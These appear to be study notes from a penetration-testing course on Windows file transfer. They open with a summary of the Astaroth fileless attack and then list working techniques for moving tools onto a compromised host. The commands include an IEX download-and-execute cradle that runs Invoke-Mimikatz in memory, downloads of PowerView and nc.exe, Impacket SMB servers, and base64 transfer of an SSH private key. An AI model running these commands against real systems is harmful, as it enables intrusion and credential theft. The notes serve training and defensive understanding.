**Overview**

The Windows operating system has evolved significantly, with new versions introducing various utilities for file transfer operations. Understanding file transfer mechanisms in Windows is crucial for both attackers and defenders:

- **Attackers**: Leverage file transfer methods to operate stealthily and evade detection.

- **Defenders**: Learn how these methods work to monitor and enforce policies that prevent attacks.

To illustrate, we will examine the Microsoft Astaroth Attack, a documented advanced persistent threat (APT) example.

## Fileless Threats and File Transfer
The Astaroth attack demonstrates how attackers utilize fileless techniques to execute their operations. Despite the name, fileless threats often involve file transfer operations, though the files themselves are not stored on disk but executed in memory.

## What Are Fileless Threats?

- Fileless threats leverage legitimate tools and processes already present on a system to carry out attacks.
- These threats do not leave traditional files behind, making detection more challenging.

## Breakdown of the Astaroth Attack

1. **Initial Infection via Spear-Phishing**
    - A malicious link embedded in a spear-phishing email leads to the download of an LNK file.
    - The user clicks the LNK file, triggering execution.

2. ## Abuse of WMIC Tool

    - The WMIC tool (Windows Management Instrumentation Command-line) is executed with the "/Format" parameter.
    - This parameter is abused to download and execute malicious JavaScript code.

3. ## File Transfer via Bitsadmin

    - The malicious JavaScript code downloads additional payloads using the Bitsadmin tool, a legitimate utility for background file transfers.

4. ## Decoding Payloads with Certutil

    - Downloaded payloads are Base64-encoded.
    - The Certutil tool is used to decode these payloads into their original form, resulting in multiple DLL files.

5. ## Execution with regsvr32

    - One of the decoded DLLs is loaded using the regsvr32 tool.

    - This DLL decrypts and loads additional files until the final payload is ready.

6. ## Final Payload Injection

    - The final payload, Astaroth, is injected into the Userinit process, allowing the attacker to persist and execute their malicious operations stealthily.

## Visual Representation of the Astaroth Attack

Below is a high-level graphical depiction of the attack:

1. Spear-phishing email âž” LNK file.

2. Execution of WMIC with /Format parameter.

3. JavaScript downloads payloads using Bitsadmin.

4. Certutil decodes Base64 payloads into DLL files.

5. regsvr32 loads DLLs, decrypting and loading additional files.

6. Final payload (Astaroth) is injected into the Userinit process.

**Understanding such attacks allows defenders to:**

- Detect unusual activity from legitimate tools (e.g., WMIC, Certutil, regsvr32).

- Monitor file transfer methods and create preventive policies.

Attackers continue to innovate, but knowledge of their methods ensures defenders can remain vigilant and respond effectively.

## Download Operations
We have access to the machine MS02 and we need to download a file from Pwnbox machine.
let's see how we can accomplish this using multiple File Download methos.

## PowerShell Based64 Encode & Decode
**Purpose:**
to transfer files without requiring network communication, particulary in situations where only terminal access is availble.

### Steps Overview
1. **Base64 Econding and Decoding**
    - Use terminal commands to encode a file into a base64 string.
    - Copy the cocoded string from the source terminal.
    - Decode the base64 string back into the original file on the target system.

2. **Ensuring File Integrity:**
    - Verfiy that the transferred file is correct by comparing its *MD5 checksum*.
    - Use `md5sum` (or equivalent tools) to calculate the compare MD5 hash before and after the transfer.

**Detailed Process:**
1. Encoding a File to Base64 (Source System):
In PowerShell:
    ```bash
    [Convert]::ToBase64String((Get-Content -Path "file.txt" -Encoding byte)) > encoded.txt
    ```
    OR in linux
    ```bash
    base64 file.txt > encoded.txt
    ```

2. **Transfer Base64 String:**
    - Open the encoded file (encoded.txt) in the terminal.
    - Copy its contents manually to the target system's terminal.
3. Decoding the File on the Target System:
In PowerShell:
```bash
[IO.File]::WriteAllBytes("file_decoded.txt", [Convert]::FromBase64String((Get-Content -Path "encoded.txt")))
```
OR linux
```bash
base64 -d encoded.txt > file_decode.txt
```
4. Verify File Integrity
    - On both systems, generate the MD5 hash of the original and decoded file.

    ```bash
        md5sum file.txt
    ```
Compare the hashes. if they match, the file transfer was successful. 

### Use Case Example:
- Transferring an SSH key:
    - Encode the key on the source system.
    - Copy the base64 string to the target system.
    - Decode the string back into the original SSH key file.
    - Verify the integrity using the MD5 checksum.

### Advantages:
- No need for network connectivity.
- Useful for secure environments with restricted communication channels.

**Considerations**:
- Ensure proper copying and pasting of the base64 string to avoid corruption.
- MD5 is not cryptographically secure for authentication purposes but is adequate for verifying file integrity.


## Pwnbox Check SSH Key MD5 Hash
    ```bash
        md5sum id_rsa
    ```
    output:
    ```4e301756a07ded0a2dd6953abf015278  id_rsa```

## Pwnbox Encode SSH Key to Base64
    ```bash
    cat id_rsa |base64 -w 0;echo

    LS0tLS1CRUdJT.....
    ```
We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.

```bash
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVO..."))
```

Finally, we can confirm if the file was transferred successfully using the Get-FileHash cmdlet, which does the same thing that md5sum does.

## Confirming the MD5 Hashes Match

```bash
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

`Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.`

# Notes on File Transfer Using PowerShell and WebClient

Most companies allow **HTTP** and **HTTPS** outbound traffic through the firewall to facilitate employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. However, defenders can implement **Web filtering solutions** to:

- Prevent access to specific website categories.
- Block the download of certain file types (e.g., `.exe`).
- Restrict access to a whitelist of domains in highly controlled networks.

## File Transfer with PowerShell

PowerShell offers various file transfer options. In any version of PowerShell, the `System.Net.WebClient` class can be used to download files over **HTTP**, **HTTPS**, or **FTP**.

### WebClient Methods for Downloading Data

| Method                 | Description                                                         |
|------------------------|---------------------------------------------------------------------|
| `OpenRead`             | Returns the data from a resource as a `Stream`.                    |
| `OpenReadAsync`        | Returns the data from a resource without blocking the calling thread. |
| `DownloadData`         | Downloads data from a resource and returns a `Byte` array.         |
| `DownloadDataAsync`    | Downloads data from a resource as a `Byte` array without blocking the calling thread. |
| `DownloadFile`         | Downloads data from a resource to a local file.                    |
| `DownloadFileAsync`    | Downloads data to a local file without blocking the calling thread. |
| `DownloadString`       | Downloads a `String` from a resource and returns a `String`.       |
| `DownloadStringAsync`  | Downloads a `String` without blocking the calling thread.          |

---

### Example: PowerShell `DownloadFile` Method

The `Net.WebClient` class and its `DownloadFile` method allow you to specify:

1. The URL of the target file to download.
2. The name of the output file where the content will be saved.

Example usage:
```powershell
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile("https://example.com/file.txt", "C:\path\to\output\file.txt")
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

## PowerShell DownloadString-Fileless Method
AS we previously discussed, fileless attacks work by using some operating system functions to downlod the payload and exccute it directly. Powershell can also be used to perfom fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in the memory using the `Invoke-Expression` cmdlet or the alias `IEX`.
```bash
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Empire/master/data/module/source/credentials/Invoke-Mimikatz.ps1')
```
The `IEX` aslo accepts pipeline input.

```bash
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
## PowerShell Invoke-WebRequest
From PowerShell 3.0 onwards, the `Invoke-WebRequest` cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.
```bash 
    PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
`Harmj0y` has compiled an extensive list of PowerShell download cradles here. It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.

## SMB Downloads
The Server Message Block protocol (SMB protocol) that runs on port `TCP/445` is common in enterprise networks where windows services are running. It enables applications and users to transfer files to and from remote servers.

WE can use SMB to download files from our pwnbox easily. We need to create an SMB server in our pwnbox with `smbserver.py` from impacket and then use `copy`, `move`,PowerShell `Copy-Item`, or any other tool that allows connection to SMB

## Create the sMB Server
```bash
    sudo impacket-smbserver share -smb2support /tmp/smbshare
```
To download a file from the SMB server to the current working directory, we can use the following command:

## Copy a File from the SMB Server
```bash
    copy \\<ip>\share\nc.exe
```
New versions of Windows block unauthenticated guest access, as we can see in the following command:

```bash
    copy \\<ip>\share\nc.exe
```
Error: You can't access this share folder because your organization's security policies block unauthenticaed guest access. ....

To transfer files in this scenario we can set a username and password using out Impacket SMB server and mount the SMB server on our windows target machine:

## Create the SMB Server with a Username and Password
```bash
    sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
## Mount the SMB Server with Username and Password
```bash
    net use n: \\<ip>\share /user:test test
    #The command completed successfully
    C:\htb> copy n:\nc.exe
    #        1 fiel(s) copied.
```
